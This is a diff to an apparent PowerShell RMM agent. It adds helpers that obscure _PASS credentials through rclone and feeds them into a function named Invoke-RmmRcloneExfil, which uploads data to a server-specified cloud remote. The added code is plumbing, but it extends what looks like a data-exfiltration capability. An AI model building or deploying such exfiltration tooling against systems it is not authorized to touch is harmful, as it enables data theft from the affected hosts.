@@ -913,6 +913,32 @@ function Ensure-RmmRcloneBinary {
     return $cache.Binary
 }
 
+function ConvertTo-RmmRcloneObscured {
+    param(
+        [Parameter(Mandatory = $true)][string]$RclonePath,
+        [Parameter(Mandatory = $true)][string]$PlainText
+    )
+    $out = & $RclonePath obscure $PlainText 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        $detail = ($out | Out-String).Trim()
+        throw "rclone obscure failed: $detail"
+    }
+    return ($out | Select-Object -Last 1).ToString().Trim()
+}
+
+function Resolve-RmmRcloneEnvValue {
+    param(
+        [Parameter(Mandatory = $true)][string]$RclonePath,
+        [Parameter(Mandatory = $true)][string]$Key,
+        [Parameter(Mandatory = $true)][string]$Value,
+        [string[]]$SkipObscure = @()
+    )
+    if ($Key -match '_PASS$' -and ($SkipObscure -notcontains $Key)) {
+        return ConvertTo-RmmRcloneObscured -RclonePath $RclonePath -PlainText $Value
+    }
+    return $Value
+}
+
 function Send-RmmCloudUploadResult {
     param(
         [hashtable]$Payload,
@@ -975,12 +1001,18 @@ function Invoke-RmmRcloneExfil {
     $dest = [string]$job.dest
     $remoteTarget = "${remoteName}:${dest}"
 
+    $skipObscure = @()
+    if ($job.env_skip_obscure) {
+        $skipObscure = @($job.env_skip_obscure | ForEach-Object { [string]$_ })
+    }
+
     $savedEnv = @{}
     if ($job.env) {
         foreach ($prop in $job.env.PSObject.Properties) {
             $key = [string]$prop.Name
             $savedEnv[$key] = [Environment]::GetEnvironmentVariable($key, 'Process')
-            Set-Item -Path "Env:$key" -Value ([string]$prop.Value)
+            $value = Resolve-RmmRcloneEnvValue -RclonePath $rclonePath -Key $key -Value ([string]$prop.Value) -SkipObscure $skipObscure
+            Set-Item -Path "Env:$key" -Value $value
         }
     }
 
